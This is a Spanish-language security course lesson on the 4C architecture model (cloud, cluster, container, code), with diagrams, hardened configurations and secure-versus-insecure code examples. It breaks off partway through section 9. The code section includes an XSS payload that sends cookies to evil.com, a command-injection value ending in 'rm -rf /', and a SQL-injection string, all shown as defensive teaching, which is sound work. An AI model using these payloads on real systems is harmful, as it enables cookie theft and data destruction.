# Clase: Diseño de Arquitectura de Seguridad

## Modelo 4C: Cloud, Cluster, Container, Code

---

**Versión:** 1.0  
**Fecha:** Abril 2026  
**Proyecto:** Curso de Ciberseguridad

---

## Tabla de Contenidos

1. ¿Qué es Arquitectura de Seguridad?
2. Fundamentos Básicos
3. Componentes de una Arquitectura
4. El Modelo 4C - Introducción
5. Capa 1: CLOUD (Infraestructura)
6. Capa 2: CLUSTER (Orquestación)
7. Capa 3: CONTAINER (Contenedores)
8. Capa 4: CODE (Aplicación)
9. Arquitectura Completa con Modelo 4C
10. Patrones Arquitectónicos
11. Zero Trust con Modelo 4C
12. Diseñar tu Propia Arquitectura (Guía Práctica)
13. Tarea 2: Propuesta de Arquitectura
14. Checklist de Arquitectura
15. Referencias

---

## 1. ¿Qué es Arquitectura de Seguridad?

### Definición Simple

La **arquitectura de seguridad** es el **plano** que define cómo se protege un sistema. Es como el plano de una casa con alarmas, cerraduras y cámaras: define dónde va cada protección y cómo funcionan juntas.

### Analogía: La Casa

```
┌─────────────────────────────────────────────────────────┐
│                    ANALOGÍA DE LA CASA                  │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Elemento de Casa    →   Elemento de Seguridad          │
│                                                         │
│  Terreno con reja    →   Firewall perimetral            │
│  Puerta principal    →   Autenticación (login)          │
│  Cerradura           →   Contraseñas / MFA              │
│  Cámara de seguridad →   Logs / Monitoreo (SIEM)        │
│  Caja fuerte         →   Cifrado de datos               │
│  Habitación privada  →   Segmentación de red            │
│  Guardia de seguridad→   SOC / Equipo de seguridad      │
│  Seguro del hogar    →   Plan de recuperación           │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### ¿Por qué importa?

| Sin Arquitectura | Con Arquitectura |
|------------------|------------------|
| Protecciones al azar | Protecciones planificadas |
| Vulnerabilidades ocultas | Riesgos identificados |
| Difícil de mantener | Fácil de escalar |
| Brechas frecuentes | Defensa coordinada |

---

## 2. Fundamentos Básicos

### 2.1 La Tríada CIA (Repaso)

```
                    ┌───────────────┐
                    │ CONFIDENCIAL  │
                    │ (Solo quien   │
                    │  debe ver)    │
                    └───────┬───────┘
                            │
              ┌─────────────┼─────────────┐
              │             │             │
       ┌──────▼──────┐     │    ┌────────▼───────┐
       │ INTEGRIDAD   │     │    │ DISPONIBILIDAD │
       │ (Sin cambios │     │    │ (Accesible     │
       │  no autor.)  │     │    │  cuando se     │
       └─────────────┘     │    │  necesita)     │
                           │    └────────────────┘
```

### 2.2 Principio de Mínimo Privilegio

Cada componente solo tiene los permisos **estrictamente necesarios**.

```
❌ MAL: El servidor web puede leer la base de datos COMPLETA
✅ BIEN: El servidor web solo puede ejecutar consultas específicas
```

### 2.3 Defensa en Profundidad (Defense in Depth)

Múltiples capas de seguridad. Si una falla, las otras protegen:

```
┌─────────────────────────────────────────────────────┐
│              DEFENSA EN PROFUNDIDAD                 │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Capa 7: Datos         → Cifrado, backup            │
│  Capa 6: Aplicación    → WAF, validación input      │
│  Capa 5: Host          → Antivirus, HIDS            │
│  Capa 4: Red Interna   → Segmentación, VLANs        │
│  Capa 3: Perímetro     → Firewall, IDS/IPS          │
│  Capa 2: Red Externa   → DDoS protection            │
│  Capa 1: Física        → Acceso al datacenter       │
│                                                     │
│  Si una capa falla, las otras siguen protegiendo.   │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### 2.4 Principio de Falla Segura (Fail Secure)

Si algo falla, el sistema debe fallar de forma **segura**:

```
❌ MAL: Si el firewall falla, permite TODO el tráfico
✅ BIEN: Si el firewall falla, bloquea TODO el tráfico
```

---

## 3. Componentes de una Arquitectura

### 3.1 Componentes Fundamentales

Todo sistema tiene estos componentes básicos:

```
┌────────────────────────────────────────────────────────┐
│               COMPONENTES BÁSICOS                      │
├────────────────────────────────────────────────────────┤
│                                                        │
│  ┌────────────┐    ┌────────────┐    ┌──────────────┐ │
│  │  CLIENTE   │───▶│  SERVIDOR  │───▶│  BASE DE     │ │
│  │  (Browser) │    │  (App)     │    │  DATOS       │ │
│  └────────────┘    └────────────┘    └──────────────┘ │
│       │                  │                    │        │
│       ▼                  ▼                    ▼        │
│  ¿Quién accede?   ¿Qué hace?          ¿Dónde se        │
│  ¿Está auten-     ¿Está autorizado?   guardan los      │
│  ticado?          ¿Es válido?         datos seguros?   │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### 3.2 Componentes de Seguridad

| Componente | Función | Ejemplo |
|-----------|---------|---------|
| **Firewall** | Controla tráfico de red | iptables, AWS Security Groups |
| **WAF** | Protege aplicaciones web | Cloudflare, ModSecurity |
| **IDS/IPS** | Detecta/previene intrusiones | Snort, Suricata |
| **SIEM** | Centraliza logs y alertas | Splunk, ELK Stack |
| **Load Balancer** | Distribuye carga | Nginx, HAProxy, ALB |
| **Proxy** | Intermediario de red | Squid, Nginx reverse proxy |
| **VPN** | Conexión segura remota | OpenVPN, WireGuard |
| **PKI** | Gestión de certificados | Let's Encrypt, AD CA |

---

## 4. El Modelo 4C - Introducción

### 4.1 ¿Qué es el Modelo 4C?

El **Modelo 4C** es un framework de seguridad que organiza las protecciones en **4 capas concéntricas**, desde la más externa hasta la más interna:

```
┌─────────────────────────────────────────────────────────┐
│                  MODELO 4C                              │
├─────────────────────────────────────────────────────────┤
│                                                         │
│              ┌───────────────────┐                      │
│              │       CLOUD       │                      │
│              │  (Infraestructura)│                      │
│              │  ┌─────────────┐  │                      │
│              │  │   CLUSTER   │  │                      │
│              │  │ (Orquest.)  │  │                      │
│              │  │ ┌─────────┐ │  │                      │
│              │  │ │CONTAINER│ │  │                      │
│              │  │ │(Runtime)│ │  │                      │
│              │  │ │ ┌─────┐ │ │  │                      │
│              │  │ │ │CODE │ │ │  │                      │
│              │  │ │ │(App)│ │ │  │                      │
│              │  │ │ └─────┘ │ │  │                      │
│              │  │ └─────────┘ │  │                      │
│              │  └─────────────┘  │                      │
│              └───────────────────┘                      │
│                                                         │
│  Cada capa protege a las internas.                      │
│  Un fallo en una capa no significa compromiso total.    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 4.2 Las 4 Capas

| Capa | Qué protege | Ejemplos |
|------|-------------|----------|
| **CLOUD** | Infraestructura cloud | AWS, Azure, GCP, redes, storage |
| **CLUSTER** | Orquestación de contenedores | Kubernetes, Docker Swarm |
| **CONTAINER** | Contenedores individuales | Docker, containerd |
| **CODE** | Código de la aplicación | Tu app, dependencias, secrets |

### 4.3 ¿Por qué 4C?

```
┌─────────────────────────────────────────────────────────┐
│                  FILOSOFÍA 4C                           │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  "Si el atacante rompe una capa,                        │
│   las siguientes deben detenerlo."                      │
│                                                         │
│  ┌─────┐    ┌─────┐    ┌─────┐    ┌─────┐             │
│  │CLOUD│───▶│CLUSTER│──▶│CONTAIN│──▶│ CODE│             │
│  │  🔒  │    │  🔒  │    │  🔒  │    │  🔒  │             │
│  └─────┘    └─────┘    └─────┘    └─────┘             │
│                                                         │
│  - La seguridad no es un producto, es un proceso        │
│  - Cada capa tiene responsabilidades diferentes         │
│  - La seguridad más débil es el punto de entrada        │
│  - No basta proteger solo el código                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 4.4 Amenazas por Capa

| Capa | Amenazas |
|------|----------|
| **CLOUD** | Config errónea de S3, IAM over-permisioned, API keys expuestas |
| **CLUSTER** | API server expuesto, RBAC mal configurado, namespace sin aislamiento |
| **CONTAINER** | Imagen vulnerable, container como root, escape de container |
| **CODE** | SQL injection, XSS, secrets hardcodeados, dependencias vulnerables |

---

## 5. Capa 1: CLOUD (Infraestructura)

### 5.1 ¿Qué es la capa Cloud?

Es la capa **más externa**. Incluye toda la infraestructura donde corre tu sistema:

- Proveedores cloud (AWS, Azure, GCP)
- Redes virtuales (VPC, VNet)
- Firewalls perimetrales
- DNS
- Storage (S3, blobs)
- Gestión de identidad (IAM)

### 5.2 Arquitectura Cloud Segura

```
┌─────────────────────────────────────────────────────────┐
│                  CAPA CLOUD                             │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  INTERNET                                               │
│      │                                                  │
│      ▼                                                  │
│  ┌──────────────────┐                                   │
│  │  DNS Protection  │  ← Cloudflare, Route 53          │
│  │  (DDoS + WAF)   │                                   │
│  └────────┬─────────┘                                   │
│           │                                             │
│  ┌────────▼─────────┐                                   │
│  │  Cloud Firewall  │  ← Security Groups, NACLs        │
│  │  (Perímetro)    │                                   │
│  └────────┬─────────┘                                   │
│           │                                             │
│  ┌────────▼──────────────────────────┐                 │
│  │  VPC / Virtual Network            │                 │
│  │                                   │                 │
│  │  ┌─────────────┐ ┌─────────────┐  │                 │
│  │  │Public Subnet│ │Private Sub. │  │                 │
│  │  │ (DMZ)       │ │ (App + DB)  │  │                 │
│  │  └─────────────┘ └─────────────┘  │                 │
│  │                                   │                 │
│  │  ┌─────────────┐ ┌─────────────┐  │                 │
│  │  │  NAT Gateway│ │  VPC Endpt  │  │                 │
│  │  └─────────────┘ └─────────────┘  │                 │
│  └───────────────────────────────────┘                 │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 5.3 IAM - Gestión de Identidad en Cloud

```
┌─────────────────────────────────────────────────────────┐
│              IAM (CLOUD) - PRINCIPIOS                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Principio de Mínimo Privilegio:                        │
│  ┌─────────────────────────────────────────────────┐   │
│  │                                                 │   │
│  │  ❌ MAL: Policy { "Action": "*", "Resource": "*"│   │
│  │                                                 │   │
│  │  ✅ BIEN: Policy {                               │   │
│  │           "Action": ["s3:GetObject"],           │   │
│  │           "Resource": "arn:aws:s3:::mi-bucket/*"│   │
│  │         }                                       │   │
│  │                                                 │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
│  Reglas de oro:                                         │
│  ├── Nunca usar credenciales de root                    │
│  ├── MFA obligatorio en cuentas admin                   │
│  ├── Rotar credenciales cada 90 días                    │
│  ├── Usar roles en lugar de usuarios para servicios     │
│  └── Auditar permisos periódicamente                    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 5.4 Ejemplo: AWS Security Groups

```hcl
# Terraform - Security Group restrictivo

resource "aws_security_group" "web" {
  name        = "web-sg"
  description = "Solo HTTPS desde internet"
  vpc_id      = aws_vpc.main.id

  # HTTPS desde cualquier IP
  ingress {
    description = "HTTPS"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH solo desde IP de admin
  ingress {
    description = "SSH admin"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.1.100/32"]
  }

  # NO permitir HTTP (redirigir a HTTPS)
  # NO permitir puertos innecesarios

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

### 5.5 Checklist Cloud

| Control | Implementación |
|---------|---------------|
| **Red** | VPC con subnets públicas/privadas |
| **Firewall** | Security Groups restrictivos |
| **WAF** | Cloudflare, AWS WAF |
| **DDoS** | Cloudflare, AWS Shield |
| **IAM** | Mínimo privilegio, MFA |
| **Logging** | CloudTrail, VPC Flow Logs |
| **Cifrado** | KMS para datos en reposo |
| **Backup** | Snapshots automatizados |

---

## 6. Capa 2: CLUSTER (Orquestación)

### 6.1 ¿Qué es la capa Cluster?

Es la capa que **orquestra** los contenedores. El ejemplo principal es **Kubernetes**:

```
┌─────────────────────────────────────────────────────────┐
│                  CAPA CLUSTER                           │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────────────────────────────┐               │
│  │  Control Plane (Master Node)        │               │
│  │                                     │               │
│  │  ┌───────────┐  ┌─────────────────┐│               │
│  │  │ API Server│  │ etcd            ││               │
│  │  │ (Puerta   │  │ (Estado del     ││               │
│  │  │  entrada) │  │  cluster)       ││               │
│  │  └─────┬─────┘  └─────────────────┘│               │
│  │        │                            │               │
│  │  ┌─────▼─────┐  ┌─────────────────┐│               │
│  │  │Scheduler  │  │ Controller Mgr  ││               │
│  │  │(Distribuye│  │ (Mantiene estado││               │
│  │  │ pods)     │  │  deseado)       ││               │
│  │  └───────────┘  └─────────────────┘│               │
│  └─────────────────────────────────────┘               │
│                                                         │
│  ┌───────────┐ ┌───────────┐ ┌───────────┐            │
│  │ Worker 1  │ │ Worker 2  │ │ Worker 3  │            │
│  │           │ │           │ │           │            │
│  │ ┌───────┐ │ │ ┌───────┐ │ │ ┌───────┐ │            │
│  │ │ Pod 1 │ │ │ │ Pod 3 │ │ │ │ Pod 5 │ │            │
│  │ │ Pod 2 │ │ │ │ Pod 4 │ │ │ │ Pod 6 │ │            │
│  │ └───────┘ │ │ └──────┘  │ │ └───────┘ │            │
│  │ kubelet   │ │ kubelet   │ │ kubelet   │            │
│  └───────────┘ └───────────┘ └───────────┘            │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 6.2 Seguridad del Cluster

```
┌─────────────────────────────────────────────────────────┐
│              SEGURIDAD DEL CLUSTER                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. API Server                                          │
│     ├── Autenticación obligatoria                       │
│     ├── Autorización RBAC                               │
│     ├── Admission Controllers                           │
│     └── TLS para todas las comunicaciones               │
│                                                         │
│  2. etcd                                                │
│     ├── Cifrado en reposo                               │
│     ├── Acceso solo desde API Server                    │
│     └── Backup cifrado                                  │
│                                                         │
│  3. Worker Nodes                                        │
│     ├── Hardening del SO                                │
│     ├── Solo puertos necesarios abiertos                │
│     └── Kubelet con autenticación                       │
│                                                         │
│  4. Network Policies                                    │
│     ├── Aislar namespaces                               │
│     ├── Controlar tráfico entre pods                    │
│     └── Default deny all                                │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 6.3 RBAC en Kubernetes

```yaml
# ServiceAccount para la aplicación
apiVersion: v1
kind: ServiceAccount
metadata:
  name: mi-app-sa
  namespace: produccion

# Role: solo permisos específicos
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: produccion
  name: mi-app-role
rules:
  # Solo puede leer pods y servicios
  - apiGroups: [""]
    resources: ["pods", "services"]
    verbs: ["get", "list", "watch"]
  # NO puede crear, modificar ni eliminar nada

# RoleBinding: vincular SA con Role
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: mi-app-binding
  namespace: produccion
subjects:
  - kind: ServiceAccount
    name: mi-app-sa
    namespace: produccion
roleRef:
  kind: Role
  name: mi-app-role
  apiGroup: rbac.authorization.k8s.io
```

### 6.4 Network Policies

```yaml
# Default deny: bloquear todo tráfico entrante
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: produccion
spec:
  podSelector: {}  # Aplica a TODOS los pods
  policyTypes:
    - Ingress

# Permitir solo tráfico del frontend al backend
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: produccion
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend
      ports:
        - protocol: TCP
          port: 8080

# Permitir solo backend a base de datos
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-backend-to-database
  namespace: produccion
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: backend
      ports:
        - protocol: TCP
          port: 5432
```

### 6.5 Checklist Cluster

| Control | Implementación |
|---------|---------------|
| **API Server** | Autenticación, TLS, audit logs |
| **RBAC** | Mínimo privilegio, ServiceAccounts |
| **Network Policies** | Default deny, segmentación |
| **Secrets** | Kubernetes Secrets + cifrado en etcd |
| **Admission** | OPA/Gatekeeper, PodSecurity |
| **Logging** | Audit logs del API Server |
| **Patching** | Actualizar versión de K8s |
| **Namespace** | Aislamiento por entorno |

---

## 7. Capa 3: CONTAINER (Contenedores)

### 7.1 ¿Qué es la capa Container?

Protege cada **contenedor individual** y su runtime:

```
┌─────────────────────────────────────────────────────────┐
│                  CAPA CONTAINER                         │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │  Host OS (Linux)                                │   │
│  │                                                 │   │
│  │  ┌───────────────────────────────────────────┐ │   │
│  │  │  Container Runtime (containerd)           │ │   │
│  │  │                                           │ │   │
│  │  │  ┌─────────────┐ ┌─────────────┐         │ │   │
│  │  │  │ Container 1 │ │ Container 2 │         │ │   │
│  │  │  │ ┌─────────┐ │ │ ┌─────────┐ │         │ │   │
│  │  │  │ │  App    │ │ │ │  App    │ │         │ │   │
│  │  │  │ │ + Libs  │ │ │ │ + Libs  │ │         │ │   │
│  │  │  │ └─────────┘ │ │ └─────────┘ │         │ │   │
│  │  │  │             │ │             │         │ │   │
│  │  │  │ Security:   │ │ Security:   │         │ │   │
│  │  │  │ - No root   │ │ - No root   │         │ │   │
│  │  │  │ - Read-only │ │ - Read-only │         │ │   │
│  │  │  │ - Limits    │ │ - Limits    │         │ │   │
│  │  │  └─────────────┘ └─────────────┘         │ │   │
│  │  └───────────────────────────────────────────┘ │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 7.2 Dockerfile Seguro

```dockerfile
# ❌ INSEGURO
FROM ubuntu:latest
COPY . /app
RUN chmod 777 /app
EXPOSE 80
CMD ["python", "app.py"]

# ✅ SEGURO

# 1. Usar imagen específica y mínima
FROM python:3.11-slim

# 2. Instalar dependencias primero (cache de Docker)
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 3. Copiar solo lo necesario
COPY --chown=appuser:appuser . /app

# 4. Crear usuario no-root
RUN groupadd -r appuser && useradd -r -g appuser appuser

# 5. Ejecutar como usuario no-root
USER appuser

# 6. Usar puerto no privilegiado (>1024)
EXPOSE 8080

# 7. Health check
HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://localhost:8080/health || exit 1

# 8. Comando de inicio
CMD ["python", "app.py"]
```

### 7.3 Qué hace cada línea y por qué

| Línea | Qué hace | Por qué es seguridad |
|-------|----------|---------------------|
| `FROM python:3.11-slim` | Imagen base específica y pequeña | Menos paquetes = menos vulnerabilidades |
| `--no-cache-dir` | No guarda cache de pip | Reduce tamaño de imagen |
| `--chown=appuser` | Copia con ownership correcto | El archivo pertenece al usuario no-root |
| `groupadd + useradd` | Crea usuario dedicado | Evita ejecutar como root |
| `USER appuser` | Cambia a usuario no-root | Si hay exploit, no tiene privilegios root |
| `EXPOSE 8080` | Puerto no privilegiado | Puertos <1024 requieren root |
| `HEALTHCHECK` | Verifica que el container vive | Detecta containers comprometidos |

### 7.4 Escaneo de Imágenes

```bash
# Escanear imagen con Trivy
trivy image mi-app:latest

# Resultado esperado:
# mi-app:latest (debian 11.6)
# ========================================
# Total: 15 (High: 3, Medium: 8, Low: 4)
#
# +----------------+------------------+----------+
# |    LIBRARY     | VULNERABILITY ID | SEVERITY |
# +----------------+------------------+----------+
# | openssl        | CVE-2023-0286    | HIGH     |
# | libcurl        | CVE-2023-23914   | HIGH     |
# | glibc          | CVE-2023-25139   | MEDIUM   |
# +----------------+------------------+----------+
```

### 7.5 Configuración segura del Container

```yaml
# Kubernetes - Pod Security
apiVersion: v1
kind: Pod
metadata:
  name: mi-app
  labels:
    app: mi-app
spec:
  securityContext:
    # No permitir contenedores privilegiados
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
    - name: app
      image: mi-app:1.0.0  # Tag específico, NO latest
      ports:
        - containerPort: 8080
      securityContext:
        # No permitir escalada de privilegios
        allowPrivilegeEscalation: false
        # Read-only filesystem
        readOnlyRootFilesystem: true
        # Drop todas las capacidades Linux
        capabilities:
          drop:
            - ALL
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"
      # Volúmenes temporales para escritura
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /app/cache
  volumes:
    - name: tmp
      emptyDir: {}
    - name: cache
      emptyDir: {}
```

### 7.6 Checklist Container

| Control | Implementación |
|---------|---------------|
| **Imagen** | Escanear con Trivy/Snyk |
| **Base** | Imagen mínima (slim, alpine, distroless) |
| **Usuario** | No ejecutar como root |
| **Filesystem** | Read-only root filesystem |
| **Capabilities** | Drop ALL, agregar solo necesarias |
| **Recursos** | CPU/Memory limits definidos |
| **Secrets** | No hardcodear, usar Secret manager |
| **Tag** | Version específico, nunca `latest` |

---

## 8. Capa 4: CODE (Aplicación)

### 8.1 ¿Qué es la capa Code?

Es la capa **más interna**. Protege el **código de tu aplicación** y sus dependencias:

```
┌─────────────────────────────────────────────────────────┐
│                    CAPA CODE                            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │  Tu Aplicación                                  │   │
│  │                                                 │   │
│  │  ┌─────────────┐ ┌─────────────┐ ┌───────────┐ │   │
│  │  │  Tu Código  │ │ Dependencias│ │  Config   │ │   │
│  │  │  (Python,   │ │ (pip, npm,  │ │ (.env,    │ │   │
│  │  │  Java, Go)  │ │  Maven)     │ │  YAML)    │ │   │
│  │  └──────┬──────┘ └──────┬──────┘ └─────┬─────┘ │   │
│  │         │               │              │       │   │
│  │         ▼               ▼              ▼       │   │
│  │  ┌───────────────────────────────────────────┐ │   │
│  │  │            AMENAZAS                       │ │   │
│  │  │  ├── SQL Injection                        │ │   │
│  │  │  ├── XSS                                  │ │   │
│  │  │  ├── Command Injection                    │ │   │
│  │  │  ├── Hardcoded Secrets                    │ │   │
│  │  │  ├── Dependencias Vulnerables             │ │   │
│  │  │  └── Lógica de negocio explotable         │ │   │
│  │  └───────────────────────────────────────────┘ │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 8.2 OWASP Top 10 (Amenazas del Código)

| # | Vulnerabilidad | Descripción | Ejemplo |
|---|---------------|-------------|---------|
| 1 | **Broken Access Control** | Usuarios hacen lo que no deberían | Acceder a datos de otro usuario |
| 2 | **Cryptographic Failures** | Cifrado débil o ausente | Contraseñas en texto plano |
| 3 | **Injection** | Código malicioso inyectado | SQL injection, command injection |
| 4 | **Insecure Design** | Diseño inseguro desde el inicio | Sin rate limiting |
| 5 | **Security Misconfiguration** | Configuración insegura | Debug mode en producción |
| 6 | **Vulnerable Components** | Librerías con vulnerabilidades | Log4Shell |
| 7 | **Auth Failures** | Autenticación débil | Sin MFA, sesiones inseguras |
| 8 | **Data Integrity** | Datos alterados sin detección | Sin firmas digitales |
| 9 | **Logging Failures** | Sin logs o logs insuficientes | No se detecta el ataque |
| 10 | **SSRF** | Server-Side Request Forgery | El servidor hace requests a tu pedido |

### 8.3 Ejemplos de Código Seguro vs Inseguro

#### SQL Injection

```python
# ❌ INSEGURO - SQL Injection
def buscar_usuario(nombre):
    query = f"SELECT * FROM users WHERE name = '{nombre}'"
    cursor.execute(query)
    return cursor.fetchone()

# Si nombre = "' OR '1'='1" → devuelve TODOS los usuarios

# ✅ SEGURO - Parameterized Query
def buscar_usuario(nombre):
    query = "SELECT * FROM users WHERE name = %s"
    cursor.execute(query, (nombre,))
    return cursor.fetchone()

# El parámetro se escapa automáticamente
```

#### XSS (Cross-Site Scripting)

```python
# ❌ INSEGURO - Reflejando input sin sanear
@app.route("/busqueda")
def busqueda():
    termino = request.args.get("q")
    return f"<h1>Resultados para: {termino}</h1>"

# Si q = "<script>document.location='https://evil.com/?c='+document.cookie</script>"

# ✅ SEGURO - Escapando output
from markupsafe import escape

@app.route("/busqueda")
def busqueda():
    termino = escape(request.args.get("q"))
    return f"<h1>Resultados para: {termino}</h1>"

# El HTML se escapa: <script> → &lt;script&gt;
```

#### Hardcoded Secrets

```python
# ❌ INSEGURO - Credenciales en código
DATABASE_URL = "postgresql://admin:mi_password_secreto@db:5432/app"
API_KEY = "sk-1234567890abcdef"
SECRET_KEY = "super-secreto-123"

# ✅ SEGURO - Variables de entorno / Secret manager
import os

DATABASE_URL = os.environ.get("DATABASE_URL")
API_KEY = os.environ.get("API_KEY")
SECRET_KEY = os.environ.get("SECRET_KEY")

# O usando un secret manager
from vault import get_secret
DATABASE_URL = get_secret("database/url")
API_KEY = get_secret("api/key")
```

#### Command Injection

```python
# ❌ INSEGURO - Comando del sistema con input del usuario
import os

def ping_host(hostname):
    os.system(f"ping -c 1 {hostname}")

# Si hostname = "google.com; rm -rf /" → ejecuta ambos comandos

# ✅ SEGURO - Sin shell, con lista de argumentos
import subprocess

def ping_host(hostname):
    # Validar que es un hostname/IP válido
    import re
    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        raise ValueError("Hostname inválido")
    
    subprocess.run(
        ["ping", "-c", "1", hostname],
        capture_output=True,
        check=False  # No lanzar excepción si falla
    )
```

### 8.4 Gestión de Dependencias

```bash
# Verificar vulnerabilidades en dependencias Python
pip install safety
safety check

# Verificar en Node.js
npm audit

# Verificar en Java/Maven
mvn dependency-check:check

# Generar SBOM (Software Bill of Materials)
pip install cyclonedx-bom
cyclonedx-py -o sbom.json
```

### 8.5 Checklist Code

| Control | Implementación |
|---------|---------------|
| **Input Validation** | Sanear todos los inputs del usuario |
| **Output Encoding** | Escapar output para prevenir XSS |
| **Parameterized Queries** | Nunca concatenar SQL |
| **Secrets** | Variables de entorno, Vault |
| **Auth** | MFA, sesiones seguras, JWT con expiración |
| **Dependencies** | Escanear con safety/npm audit |
| **Error Handling** | No mostrar stack traces al usuario |
| **Logging** | Logs estructurados, sin datos sensibles |

---

## 9. Arquitectura Completa con Modelo 4C

### 9.1 Diagrama Completo

```
┌─────────────────────────────────────────────────────────────────┐
│                    ARQUITECTURA MODELO 4C                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ╔═══════════════════════════════════════════════════════════╗  │
│  ║  CAPA 1: CLOUD                                            ║  │
│  ║  ┌─────────────────────────────────────────────────────┐ ║  │
│  ║  │  Internet → DNS → WAF → DDoS Protection → VPC      │ ║  │
│  ║  │                                                     │ ║  │
│  ║  │  IAM: MFA, mínimo privilegio, roles                 │ ║  │
│  ║  │  Logging: CloudTrail, VPC Flow Logs                 │ ║  │
│  ║  │  Cifrado: KMS para datos en reposo                  │ ║  │
│  ║  └─────────────────────┬───────────────────────────────┘ ║  │
│  ║                        │                                  │  │
│  ║  ╔═════════════════════╧═══════════════════════════════╗ ║  │
│  ║  ║  CAPA 2: CLUSTER                                    ║ ║  │
│  ║  ║  ┌───────────────────────────────────────────────┐ ║ ║  │
│  ║  ║  │  Kubernetes Cluster                           │ ║ ║  │
│  ║  ║  │                                               │ ║ ║  │
│  ║  ║  │  Control Plane: API Server (TLS + auth)       │ ║ ║  │
│  ║  ║  │  RBAC: mínimo privilegio, ServiceAccounts      │ ║ ║  │
│  ║  ║  │  Network Policies: default deny, segmentación  │ ║ ║  │
│  ║  ║  │  Secrets: cifrados en etcd                     │ ║ ║  │
│  ║  ║  └─────────────────────┬─────────────────────────┘ ║ ║  │
│  ║  ║                        │                            │ ║  │
│  ║  ║  ╔═════════════════════╧═════════════════════════╗ ║ ║  │
│  ║  ║  ║  CAPA 3: CONTAINER                            ║ ║ ║  │
│  ║  ║  ║  ┌─────────────────────────────────────────┐ ║ ║ ║  │
│  ║  ║  ║  │  Container Runtime                       │ ║ ║ ║  │
│  ║  ║  ║  │                                         │ ║ ║ ║  │
│  ║  ║  ║  │  Imagen: escaneada, mínima, específica   │ ║ ║ ║  │
│  ║  ║  ║  │  Runtime: no-root, read-only, limits     │ ║ ║ ║  │
│  ║  ║  ║  │  Capabilities: drop ALL                  │ ║ ║ ║  │
│  ║  ║  ║  │  Health checks configurados              │ ║ ║ ║  │
│  ║  ║  ║  └──────────────────┬──────────────────────┘ ║ ║ ║  │
│  ║  ║  ║                     │                         │ ║ ║  │
│  ║  ║  ║  ╔══════════════════╧═══════════════════════╗ ║ ║ ║  │
│  ║  ║  ║  ║  CAPA 4: CODE                            ║ ║ ║ ║  │
│  ║  ║  ║  ║  ┌─────────────────────────────────────┐ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Aplicación                         │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │                                     │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Input validation + output encoding │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Parameterized queries              │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Secrets en vault                   │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Auth + MFA + JWT                   │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Dependencies escaneadas             │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  │  Logging estructurado                │ ║ ║ ║ ║  │
│  ║  ║  ║  ║  └─────────────────────────────────────┘ ║ ║ ║ ║  │
│  ║  ║  ║  ╚═════════════════════════════════════════╝ ║ ║ ║  │
│  ║  ║  ╚═════════════════════════════════════════════╝ ║ ║  │
│  ║  ╚═════════════════════════════════════════════════╝ ║  │
│  ╚═════════════════════════════════════════════════════╝  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 9.2 Flujo de una Petición con 4C

```
Petición del usuario → Cómo atraviesa las 4 capas:

┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  Usuario: "GET /api/usuarios"                                   │
│         │                                                       │
│         ▼                                                       │
│  ════ CLOUD ════                                                │
│  1. DNS resuelve dominio → IP del load balancer                │
│  2. WAF inspecciona request → bloquear si es malicioso          │
│  3. DDoS protection verifica tráfico legítimo                   │
│  4. Security Group permite tráfico en puerto 443                │
│         │                                                       │
│         ▼                                                       │
